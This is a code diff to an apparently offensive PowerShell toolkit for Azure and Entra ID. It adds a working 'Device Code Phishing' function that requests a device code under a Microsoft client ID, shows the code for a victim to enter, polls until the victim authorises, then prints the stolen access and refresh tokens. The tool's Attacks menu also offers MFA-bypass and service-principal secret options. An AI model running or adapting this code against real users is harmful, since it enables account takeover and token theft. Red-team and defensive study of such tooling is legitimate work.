@@ -259,7 +259,8 @@ function AzureCLILoginMenu {
         DisplayHeader
         Write-Host "Azure CLI Login" -ForegroundColor Cyan
         Write-Host "1. Interactively"
-        Write-Host "2. Service Principal"
+        Write-Host "2. Device Code"
+        Write-Host "3. Service Principal"
         Write-Host "B. Back to Login Menu"
 
         $userInput = Read-Host -Prompt "Select a login method"
@@ -268,6 +269,9 @@ function AzureCLILoginMenu {
                 Login-AzureCLI
             }
             "2" {
+                Login-AzureCLI-DC
+            }
+            "3" {
                 Login-AzureCLI-SP
             }
             "B" {
@@ -290,6 +294,33 @@ function Login-AzureCLI {
         az logout
         if ($tenantID -ne "Not set") {
             $result = az login --tenant $tenantID --output json
+            $loginInfo = $result | ConvertFrom-Json | Select-Object -First 1
+            $Global:azureCliAccount = $loginInfo.user.name
+
+            # Fetch Object ID using the logged-in user
+            $userId = az ad user show --id $loginInfo.user.name --query id -o tsv
+            $Global:azureCliId = $userId
+
+            Write-Host "Successfully logged into Azure CLI as $azureCliAccount." -ForegroundColor Green
+            Pause
+        } else {
+            Write-Host "Tenant must be set before logging in. Please set the tenant first." -ForegroundColor Red
+            Pause
+        }
+    }
+    catch {
+        Write-Host "Error during Azure CLI login: $_" -ForegroundColor Red
+        Pause
+    }
+}
+
+function Login-AzureCLI-DC {
+    ResetAzModuleDetails
+    Write-Host "Logging into Azure CLI via Device Code flow using tenant '$tenantID'..." -ForegroundColor Yellow
+    try {
+        az logout
+        if ($tenantID -ne "Not set") {
+            $result = az login --use-device-code --tenant $tenantID --output json
             $loginInfo = $result | ConvertFrom-Json | Select-Object -First 1
             $Global:azureCliAccount = $loginInfo.user.name
 
@@ -1646,6 +1677,7 @@ function AttacksMenu {
         Write-Host "3. Set New Secret for Service Principal"
         Write-Host "4. Try to bypass MFA with MFASweep"
         Write-Host "5. Try to bypass MFA with GraphRunner"
+        Write-Host "6. Device Code Phishing"
         Write-Host "B. Return to Main Menu"
 
         $userInput = Read-Host -Prompt "Select an option"
@@ -1664,6 +1696,9 @@ function AttacksMenu {
             }
             "5" {
                 GraphRunnerBypassMFA
+            }
+            "6" {
+                DeviceCodePhishing
             }
             "B" {
                 return
@@ -1869,6 +1904,91 @@ function MFASweep {
     
     Write-Host "`nPress any key to return to the Attacks menu..."
     [void][System.Console]::ReadKey($true)
+}
+
+function DeviceCodePhishing {
+    Clear-Host
+    DisplayHeader
+    Write-Host "Device Code Phishing" -ForegroundColor Cyan
+    Write-Host "Select the resource (scope) to target:" -ForegroundColor Yellow
+
+    $resources = @(
+        @{ Name = "Microsoft Graph"; URL = "https://graph.microsoft.com" },
+        @{ Name = "Azure Management"; URL = "https://management.azure.com/" }
+    )
+
+    for ($i = 0; $i -lt $resources.Count; $i++) {
+        Write-Host "$($i + 1)) $($resources[$i].Name)"
+    }
+
+    $selection = Read-Host "Enter your choice"
+    if ($selection -notin @("1", "2")) {
+        Write-Error "Invalid selection. Exiting."
+        return
+    }
+
+    $resource = $resources[$selection - 1].URL
+    Write-Host "Selected resource: $resource" -ForegroundColor Green
+
+    $body = @{
+        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        "resource"  = $resource
+    }
+
+    Write-Host "`nRequesting device code..." -ForegroundColor Cyan
+    $authResponse = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
+
+    Write-Host "`nPlease go to: $($authResponse.verification_url)" -ForegroundColor Yellow
+    Write-Host "Enter the code: $($authResponse.user_code)" -ForegroundColor Green
+    Write-Host "`n start polling for tokens..."
+    
+
+    $interval = $authResponse.interval
+    $expires = $authResponse.expires_in
+    $total = 0
+
+    $pollingBody = @{
+        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+        "code" = $authResponse.device_code
+        "resource" = $resource
+    }
+
+    Write-Host "`nPolling for token..." -ForegroundColor Cyan
+    while ($true) {
+        Start-Sleep -Seconds $interval
+        $total += $interval
+
+        if ($total -gt $expires) {
+            Write-Error "Timeout occurred. Device code expired."
+            return
+        }
+
+        try {
+            $response = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0" -Body $pollingBody -ErrorAction Stop
+            break
+        }
+        catch {
+            $details = $_.ErrorDetails.Message | ConvertFrom-Json
+            if ($details.error -eq "authorization_pending") {
+                Write-Host "Waiting for user authorization..." -ForegroundColor Magenta
+            }
+            elseif ($details.error -eq "authorization_declined") {
+                Write-Error "Authorization was declined."
+                return
+            }
+            else {
+                Write-Error "Unexpected error: $($details.error_description)"
+                return
+            }
+        }
+    }
+
+    Write-Host "Tokens acquired successfully!" -ForegroundColor Green
+    Write-Host "Resource: $($response.resource)" -ForegroundColor DarkGreen
+    Write-Host "Access Token: $($response.access_token)" -ForegroundColor Green
+    Write-Host "Refresh Token: $($response.refresh_token)" -ForegroundColor DarkGreen
+    Pause
 }
 
 # Login menu structure
@@ -2856,9 +2976,9 @@ function TokensMenu {
         Clear-Host
         DisplayHeader
         Write-Host "Tokens Menu with Functions from Fabian Bader's TokenTactics v2" -ForegroundColor Cyan
-        Write-Host "1. Invoke-RefreshToAzureManagementToken"
+        Write-Host "1. Invoke-RefreshToAzureManagementToken - needed for Az PowerShell Module"
         Write-Host "2. Invoke-RefreshToAzureCoreManagementToken"
-        Write-Host "3. Invoke-RefreshToGraphToken"
+        Write-Host "3. Invoke-RefreshToGraphToken - needed for Graph PowerShell Module"
         Write-Host "B. Return to Main Menu"
 
         $userInput = Read-Host -Prompt "Select an option"
